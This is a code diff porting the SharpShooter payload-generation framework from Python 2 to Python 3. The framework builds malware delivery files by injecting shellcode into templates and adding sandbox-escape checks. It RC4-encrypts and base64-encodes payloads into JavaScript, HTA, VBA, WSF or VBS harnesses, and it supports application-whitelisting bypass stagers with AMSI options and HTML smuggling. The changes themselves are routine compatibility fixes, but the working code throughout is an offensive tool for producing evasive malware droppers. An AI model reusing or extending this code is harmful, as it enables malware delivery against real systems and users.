@@ -1,4 +1,4 @@
-#! /usr/bin/env python
+#!/usr/bin/env python3
 
 # -*- coding: utf-8 -*-
 #
@@ -17,6 +17,8 @@ import random
 import string
 import sys
 import argparse
+import os
+import traceback
 from jsmin import jsmin
 from modules import *
 
@@ -162,12 +164,12 @@ class SharpShooter:
         return args
 
     def read_file(self, f):
-        with open(f, 'r') as fs:
+        with open(f, 'rb') as fs:
             content = fs.read()
         return content
 
     def rand_key(self, n):
-        return ''.join([random.choice(string.lowercase) for i in xrange(n)])
+        return ''.join([random.choice(string.ascii_lowercase) for i in range(n)])
 
     def gzip_str(self, string_):
         fgz = BytesIO()
@@ -182,7 +184,7 @@ class SharpShooter:
         return fgz
 
     def rc4(self, key, data):
-        S = range(256)
+        S = list(range(256))
         j = 0
         out = []
 
@@ -201,8 +203,9 @@ class SharpShooter:
 
     def run(self, args):
 
-        template_body = ""
+        template_body = b""
         template_base = "templates/sharpshooter."
+        source_path = os.path.dirname(os.path.realpath(__file__)) + "/"
         shellcode_delivery = False
         shellcode_gzip = ""
         payload_type = 0
@@ -260,6 +263,7 @@ End Sub"""
                 template_base = "templates/sharpshooterv4."
 
         #print(template_base)
+        template_base = source_path + template_base
 
         if(args.payload == "hta"):
             payload_type = 1
@@ -401,6 +405,7 @@ End Sub"""
             except Exception as e:
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
 
+        template_body = template_body.decode(encoding='utf-8')
         template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
 
         delivery_method = "1"
@@ -425,16 +430,16 @@ End Sub"""
                 shellcode_payload = shellcode_payload.lower()
                 if (shellcode_payload == "y" or shellcode_payload == "yes"):
                     shellcode_delivery = True
-                    shellcode_template = self.read_file("templates/shellcode.cs")
+                    shellcode_template = self.read_file(source_path + "templates/shellcode.cs")
 
                     shellcode = []
 
                     sc = self.read_file(args.shellcode_file)
                     shellcode.append(sc)
 
-                    shellcode = "\n".join(shellcode)
+                    shellcode = b"\n".join(shellcode)
 
-                    shellcode_final = shellcode_template.replace("%SHELLCODE%", shellcode)
+                    shellcode_final = shellcode_template.replace(b"%SHELLCODE%", shellcode)
                     shellcode_gzip = self.gzip_str(shellcode_final)
 
                 elif (args.stageless or stageless_payload is True):
@@ -444,7 +449,7 @@ End Sub"""
                     #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                     #    for i in sc_split:
                     #else:
-                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc)
+                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc.decode(encoding='utf-8'))
 
                 else:
                     refs = args.refs
@@ -491,8 +496,8 @@ End Sub"""
                     template_code = template_code.replace("%DELIVERY%", deliverycode)
 
                 break
-            except Exception as e:
-                print(e)
+            except Exception:
+                print(traceback.format_exc())
                 print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
                 sys.exit(-1)
 
@@ -516,36 +521,36 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(payload_encrypted)
+        payload_encoded = base64.b64encode(payload_encrypted.encode(encoding='utf-8'))
 
         awl_payload_simple = ""
 
         if("js" in file_type or args.comtechnique):
-            harness = self.read_file("templates/harness.js")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            harness = self.read_file(source_path + "templates/harness.js").decode(encoding='UTF-8')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
             awl_payload_simple = template_code
         elif("wsf" in file_type):
-            harness = self.read_file("templates/harness.wsf")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            harness = self.read_file(source_path + "templates/harness.wsf").decode(encoding='utf-8')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("hta" in file_type):
-            harness = self.read_file("templates/harness.hta")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            harness = self.read_file(source_path + "templates/harness.hta").decode(encoding='utf-8')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
         elif("vba" in file_type):
-            harness = self.read_file("templates/harness.vba")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            harness = self.read_file(source_path + "templates/harness.vba").decode(encoding='utf-8')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
             payload_minified = jsmin(payload)
         elif("slk" in file_type):
             pass
         else:
-            harness = self.read_file("templates/harness.vbs")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            harness = self.read_file(source_path + "templates/harness.vbs").decode(encoding='utf-8')
+            payload = harness.replace("%B64PAYLOAD%", payload_encoded.decode(encoding='utf-8'))
             payload = payload.replace("%KEY%", "\"%s\"" % (key))
 
         if (payload_type == 3):
@@ -553,7 +558,7 @@ End Sub"""
         elif (payload_type == 5):
             file_type = "vbe"
 
-        f = open("output/" + outputfile_payload, 'w')
+        f = open(outputfile_payload, 'w')
         #print(payload)
         if(payload_type == 8):
             f.write(macro_stager)
@@ -563,9 +568,9 @@ End Sub"""
         
         if(args.comtechnique):
             if not args.awltechnique or args.awltechnique == "wmic":
-                payload_file = "output/" + outputfile + ".xsl"
+                payload_file = outputfile + ".xsl"
             else:
-                payload_file = "output/" + outputfile + ".sct"
+                payload_file = outputfile + ".sct"
 
             #if("js" in file_type or "hta" in file_type or "wsf" in file_type):
             awl_payload = awl.create_com_stager(args.comtechnique, file_type, args.awlurl, payload_file, awl_payload_simple, args.amsi)
@@ -578,21 +583,21 @@ End Sub"""
             f.write(payload)
         f.close()
 
-        print("\033[1;34m[*]\033[0;0m Written delivery payload to output/%s" % outputfile_payload)
+        print("\033[1;34m[*]\033[0;0m Written delivery payload to %s" % outputfile_payload)
         if shellcode_delivery:
             outputfile_shellcode = outputfile + ".payload"
-            with open("output/" + outputfile_shellcode, 'w') as f:
+            with open(outputfile_shellcode, 'w') as f:
                 gzip_encoded = base64.b64encode(shellcode_gzip.getvalue())
-                f.write(gzip_encoded)
+                f.write(gzip_encoded.decode(encoding='utf-8'))
                 f.close()
-                print("\033[1;34m[*]\033[0;0m Written shellcode payload to output/%s" % outputfile_shellcode)
+                print("\033[1;34m[*]\033[0;0m Written shellcode payload to %s" % outputfile_shellcode)
 
         if "vba" not in file_type:
             if (args.smuggle):
                 key = self.rand_key(10)
                 template = ""
                 template = args.template
-                embedinhtml.run_embedInHtml(key, "./output/" + outputfile_payload, "./output/" + outputfile + ".html", template)
+                embedinhtml.run_embedInHtml(key, outputfile_payload, outputfile + ".html", template)
 if __name__ == "__main__":
     ss = SharpShooter()
     args = ss.validate_args()
